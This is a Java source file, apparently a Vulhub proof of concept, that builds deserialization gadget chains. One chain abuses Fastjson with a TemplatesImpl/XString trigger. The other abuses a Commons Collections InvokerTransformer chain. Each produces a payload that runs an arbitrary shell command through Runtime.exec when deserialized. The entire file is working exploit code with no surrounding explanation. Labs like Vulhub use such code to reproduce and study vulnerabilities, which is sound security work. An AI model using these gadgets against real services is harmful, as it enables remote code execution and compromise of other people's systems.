package org.vulhub.poc;

import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class FastjsonGadget {
    static {
        System.setProperty("jdk.xml.enableTemplatesImplDeserialization", "true");
    }

    public static Object create(String command) throws Exception {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("oops", (Serializable) createTemplatesImpl(command));
        return makeToStringTrigger(jsonObject);
    }

    public static Object createForFst(String command) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        };
        ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "pwn");
        HashSet set = makeHashSet(entry);
        lazyMap.clear();
        setFieldValue(transformerChain, "iTransformers", transformers);
        return set;
    }

    private static Templates createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{
                makeTransletBytecode(command),
                classAsBytes(Foo.class)
        });
        setFieldValue(templates, "_transletIndex", 0);
        setFieldValue(templates, "_name", "Pwnr");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }

    public static byte[] makeTransletBytecode(String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));

        CtClass clazz = pool.get(StubTransletPayload.class.getName());
        clazz.setName("org.vulhub.poc.Pwner" + System.nanoTime());
        clazz.makeClassInitializer().insertAfter(commandInitializer(command));
        return clazz.toBytecode();
    }

    private static String commandInitializer(String command) {
        String touchPrefix = "touch ";
        if (command.startsWith(touchPrefix) && command.indexOf(';') == -1 && command.indexOf('&') == -1
                && command.indexOf('|') == -1 && command.indexOf('`') == -1 && command.indexOf('$') == -1) {
            return "new java.io.File(\"" + javaString(command.substring(touchPrefix.length()).trim())
                    + "\").createNewFile();";
        }
        return "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", \"" + javaString(command)
                + "\"});";
    }

    private static Object makeToStringTrigger(Object object) throws Exception {
        XString xString = new XString("trigger");
        return makeCollisionMap(new HotSwappableTargetSource(object), new HotSwappableTargetSource(xString));
    }

    private static HashMap<Object, Object> makeCollisionMap(Object value1, Object value2) throws Exception {
        HashMap<Object, Object> map = new HashMap<>();
        setFieldValue(map, "size", 2);

        Class<?> nodeClass;
        try {
            nodeClass = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeClass = Class.forName("java.util.HashMap$Entry");
        }

        Constructor<?> constructor = nodeClass.getDeclaredConstructor(
                Integer.TYPE, Object.class, Object.class, nodeClass
        );
        constructor.setAccessible(true);

        Object table = Array.newInstance(nodeClass, 2);
        Array.set(table, 0, constructor.newInstance(0, value1, value1, null));
        Array.set(table, 1, constructor.newInstance(0, value2, value2, null));
        setFieldValue(map, "table", table);
        return map;
    }

    private static HashSet makeHashSet(Object value) throws Exception {
        HashSet set = new HashSet();
        set.add("foo");

        Field mapField = getField(HashSet.class, "map");
        mapField.setAccessible(true);
        HashMap map = (HashMap) mapField.get(set);
        Field tableField = getField(map.getClass(), "table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(map);
        Object node = null;
        for (Object candidate : table) {
            if (candidate != null) {
                node = candidate;
                break;
            }
        }
        setFieldValue(node, "key", value);
        return set;
    }

    private static byte[] classAsBytes(Class<?> clazz) {
        String resource = clazz.getName().replace('.', '/') + ".class";
        try (InputStream input = FastjsonGadget.class.getClassLoader().getResourceAsStream(resource)) {
            if (input == null) {
                throw new IOException("class resource not found: " + resource);
            }

            byte[] buffer = new byte[1024];
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            int length;
            while ((length = input.read(buffer)) != -1) {
                output.write(buffer, 0, length);
            }
            return output.toByteArray();
        } catch (IOException e) {
            throw new IllegalStateException(e);
        }
    }

    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    private static Field getField(Class<?> clazz, String fieldName) throws NoSuchFieldException {
        Class<?> current = clazz;
        while (current != null) {
            try {
                return current.getDeclaredField(fieldName);
            } catch (NoSuchFieldException ignored) {
                current = current.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    private static String javaString(String value) {
        return value.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = 1L;

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
                throws TransletException {
        }
    }

    public static class Foo implements Serializable {
        private static final long serialVersionUID = 1L;
    }
}
